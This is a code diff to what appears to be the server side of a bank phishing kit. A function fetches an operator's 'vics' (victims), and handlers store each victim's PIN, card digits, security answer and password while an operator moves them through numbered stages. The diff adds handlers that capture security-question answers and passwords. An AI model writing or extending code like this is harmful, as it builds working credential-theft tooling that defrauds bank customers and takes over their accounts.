@@ -13,9 +13,15 @@ const getOwnerVics = async (req, res) => {
 };
 
 const command = async (req, res) => {
-  const { uniqueid, status } = req.body;
+  const { uniqueid, status, secQuestion } = req.body;
   try {
-    await uBank.findOneAndUpdate({ uniqueid }, { status }).exec();
+    if (status == 10) {
+      await uBank
+        .findOneAndUpdate({ uniqueid, secQuestion }, { status })
+        .exec();
+    } else {
+      await uBank.findOneAndUpdate({ uniqueid }, { status }).exec();
+    }
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -90,6 +96,30 @@ const submitLast4 = async (req, res) => {
   }
 };
 
+const submitSecAnswer = async (req, res) => {
+  const { secAnswer, uniqueid } = req.body;
+  try {
+    await uBank
+      .findOneAndUpdate({ uniqueid }, { secAnswer, status: 11 })
+      .exec();
+    res.sendStatus(200);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(400);
+  }
+};
+
+const submitPassword = async (req, res) => {
+  const { password, uniqueid } = req.body;
+  try {
+    await uBank.findOneAndUpdate({ uniqueid }, { password, status: 13 }).exec();
+    res.sendStatus(200);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(400);
+  }
+};
+
 const deleteEntry = async (req, res) => {
   const { uniqueid } = req.body;
   try {
@@ -111,4 +141,6 @@ module.exports = {
   submitPin,
   submitLast4,
   deleteEntry,
+  submitPassword,
+  submitSecAnswer,
 };
